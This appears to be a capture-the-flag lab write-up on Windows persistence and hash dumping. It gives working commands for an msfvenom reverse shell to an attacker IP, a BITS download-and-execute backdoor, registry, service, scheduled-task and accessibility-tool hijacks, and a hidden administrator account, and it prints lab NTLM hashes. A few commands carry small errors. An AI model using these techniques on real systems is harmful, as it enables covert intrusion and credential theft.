> Persistence

Persistence is a post-exploitation activity used by penetration testers in order to keep access to a system throughout the whole assessment and not to have to re-exploit the target even if the system restarts.

It can be considered that there are two types of persistence. These two types are:

1. Low privileged persistence
2. Privileged user persistence

# Low privileged persistence:

The penetration tester gained and uses persistence techniques to keep his access to the target system under a normal user profile/account (a domain user with no administrative rights).

# Privileged user persistence:

After gaining access to a system, sometimes (because it would be inaccurate to say always), a penetration tester will do privilege escalation in order to gain access to the highest privilege user that can be on a Windows machine (nt authority\system).

After privilege escalation, he will use persistence in order to keep the access he gained.

# Default Credentials

`tryhackme`:`tryhackme123`

Let's create a backdoor using msfvenom.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.107.21 LPORT=1234 -f exe > shell.exe
```

Let's pass it to the attacking machine using our python server but we have to make the internet explorer accept our site.

# Steps to follow in Internet Explorer

1. Go to Internet Explorer settings and choose "Internet Options".
2. Click on the "Security" tab, select "Trusted Sites" and then click on the "Sites" button. 
3. Fill the "Add this website to the zone" field with your IP address and click the "Add" button.

Now we can access our python server here. We got a meterpreter session as `PERSISTENCE\tryhackme`.

# Low privileged Persistence

1. The path of the startup folder is: `C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.`. Browse to that path and upload the binary you generated with msfvenom. We can use upload utility here.

2. Depending on the registries a low privileged user might be able to edit them. With this in mind, an attacker could edit the registries to achieve persistence. An example of an editable registry is: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
First, let's move the backdoor to the AppData folder. You can either move it from the Startup folder or upload it again to the AppData folder.

Drop into a shell and use the reg add function to create a registry that will run our backdoor as follows:

```
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\tryhackme\AppData\Roaming\shell.exe" 
```

3. BITS (Background Intelligent Transfer Service)﻿ is used for file transfer between machines (downloading or uploading) using idle network bandwidth.

BITS Jobs are containers that contain files that need to be transferred. However, when creating the job the container is empty and it needs to be populated (specify one or more files to be transferred). It's also needed to add the source and the destination.
Now that we know what BITS is and what jobs are used for let's try achieving persistence.
You can view the BITS help menu by typing: bitsadmin in the command line/the shell you spawned.

1. Let's create the job: `bitsadmin /create backdoor`
2. Add the file for the job that will be transferred: b`itsadmin /addfile backdoor "http://$IP:backdoor.exe" "C:\Users\tryhackme\Documents\backdoor.exe"`
3. make BITS execute our backdoor: `bitsadmin /SetNotifyCmdLine 1 cmd.exe "/c bitsadmin.exe /complete backdoor | start /B C:\Users\tryhackme\Documents\backdoor.exe`
4. NULL is used at the end of the syntax because our backdoor doesn't have any additional parameters.
Since we want our backdoor to be persistent we'll set a retry delay for the job.
`bitsadmin /SetMinRetryDelay backdoor 30`
5. Finally, we'll start/resume the job.

**Note: In order to work you have to have a webserver (i used apache) running so BITS can download the backdoor and Metasploit listening for connections.**

To execute the job type: bitsadmin /resume. 

**Note: BITS is very unstable and can and might give you just temporary persistence.**

# Privileged Users Persistence

## Credentials

`Administrator`:`Tryhackme123!`

# Creating another administrator user

1. Drop into a shell and create a new user. The syntax is: `net user /add <USER> <PASSWORD>`.
2. Now just add the username to the local administrators' group. `net localgroup Administrators Backdoor /add`
3. By checking the users that are in the Administrators' group we can see our newly created and added user: `net localgroup Administrators`

# Editing registries

We can backdoor the Winlogon so when a user logs in our backdoor will get executed. The registry used is: `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`. Upload the backdoor if you haven't and add the registry entry. The command is:
`reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, <PATH_TO_BINARY>" /f`

# Persistence by creating a service

There is the possibility to create a service leveraging Powershell which will execute our backdoor.
Load Powershell into the meterpreter instance by typing: `load powershell`
To drop into a Powershell shell type: `powershell_shell`
Create the service using the New-Service cmdlet:

```
New-Service -Name "<SERVICE_NAME>" -BinaryPathName "<PATH_TO_BINARY>" -Description "<SERVICE_DESCRIPTION>" -StartupType "Boot"`
```

The service is stopped, but by checking the services you can notice that the service will start automatically

# Scheduled tasks

Scheduled tasks are used to schedule the launch of specific programs or scripts at a pre-defined time or when it meets a condition (Ex: a user logs in).
Powershell can be used to create a scheduled task and assure persistence but for that, we'll have to define multiple cmdlets. These are:

1. New-ScheduledTaskAction - Is used to define the action that is going to be made.
2. New-ScheduledTaskTrigger - Defining the trigger (daily/weekly/monthly, etc). The trigger can be considered a condition that when met the scheduled task will launch the action.
3. New-ScheduledTaskPrincipal - Is the user that the task will be run as.
4. New-ScheduledTaskSettingsSet - This will set our above-mentioned settings.
5. Register-ScheduledTask - Will create the task.
6. Knowing this let's create the task using Powershell. 

```
$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Administrator\Desktop\backdoor.exe"
$B = New-ScheduledTaskTrigger -AtLogOn
$C = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -RunLevel Highest
$d = New-ScheduledTaskSettingsSet
$E = New-ScheduledTask -Action $A -Trigger $B -Principal $c -Settings $D
Register-ScheduledTask Backdoor -InputObject $E
```

Checking Task Scheduler you can see there is a task created and will run every time a users logs in.

# Backdooring RDP

An example would be using Metasploit to backdoor OSK (On-screen keyboard).

Metasploit sticky_keys module can be used: `search sticky`
Sign out/Lock the account and press Windows Key + U and choose On-screen keyboard. A CMD should be prompted.

The same results can be achieved by editing the registry using the command:

`REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f`

# Hash Dumping

Hash dumping is the technique used by penetration testers to extract the password hashes off of the target system to either crack them or to try to do lateral movement.
The simplest way to do hash dumping is by using Metasploit's hashdump/kiwi module: `run post/windows/gather/hashdump`

The same result can be achieved by saving the SAM and SYSTEM registries, downloading the files and using samdump2.
Let's save first the registries on the target machine:

`reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM
reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SAM`

With the registries saved download the files to the attacker machine and use samdump2 to recover the hashes.

```
(remote)download SAM
(remote)download SYSTEM
(local)sam2dump SYSTEM SAM
```

It seems some users do not appear, only their hashes. However, for that issue, you can query for users that are on the system.

You can dump credentials using kiwi, which is the equivalent of mimikatz. To do that you'll need to load the module: load kiwi.
The command used to dump the SAM database hashes is: `lsa_dump_sam`

1. load kiwi
2. getsystem
3. lsa_dump_sam

```
Domain : PERSISTENCE
SysKey : 31066436b67d1dfb03c9f249b9aed099
Local SID : S-1-5-21-3421978194-83625553-4099171136

SAMKey : d0bb192867888f2d94bc148c442c6c7c

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 52745740e9a05e6195731194f03865ea

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000003e8 (1000)
User : joe
  Hash NTLM: 878d8014606cda29677a44efa1353fc7

RID  : 000003e9 (1001)
User : chris
  Hash NTLM: e0b6050c7280bf4a7bee599cf374fd80

RID  : 000003ea (1002)
User : tryhackme
  Hash NTLM: 0c7ba4684821cd349e327896d9db4474
```

